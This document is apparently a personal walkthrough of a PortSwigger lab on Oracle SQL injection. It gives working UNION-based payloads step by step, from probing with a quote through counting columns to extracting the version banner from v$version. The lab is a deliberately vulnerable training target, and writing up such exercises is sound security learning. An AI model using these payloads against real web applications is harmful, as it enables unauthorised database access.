# [Lab: SQL injection attack, querying the database type and version on Oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle)

## Lab

This lab contains an SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string.

Hint:

On Oracle databases, every SELECT statement must specify a table to select FROM. If your UNION SELECT attack does not query from a table, you will still need to include the FROM keyword followed by a valid table name.

There is a built-in table on Oracle called dual which you can use for this purpose. For example: UNION SELECT 'abc' FROM dual

For more information, see our SQL injection cheat sheet.

## Solutions

1. Detect SQLi:

    - `GET /filter?category=' HTTP/1.1`

    ```http
    HTTP/1.1 500 Internal Server Error
    ```

2. Determining the number of columns using `ORDER BY`:
    - positions: `GET /filter?category='+ORDER+BY+ยง1ยง-- HTTP/1.1`
    - payloads: 1 -> 10
    - result: 2 columns
3. Finding a column containing text:

    ```http
    GET /filter?category='UNION+SELECT+'s','s'+FROM+dual-- HTTP/1.1`
    ```

    - => both columns contain text

4. from [cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet), to get the version of oracle database:

    - `SELECT banner FROM v$version`
    - `SELECT version FROM v$instance`

5. Exploit:

    ```http
    GET /filter?category='UNION+SELECT+banner,NULL+FROM+v$version-- HTTP/1.1`
    ```

    => Lab Solved
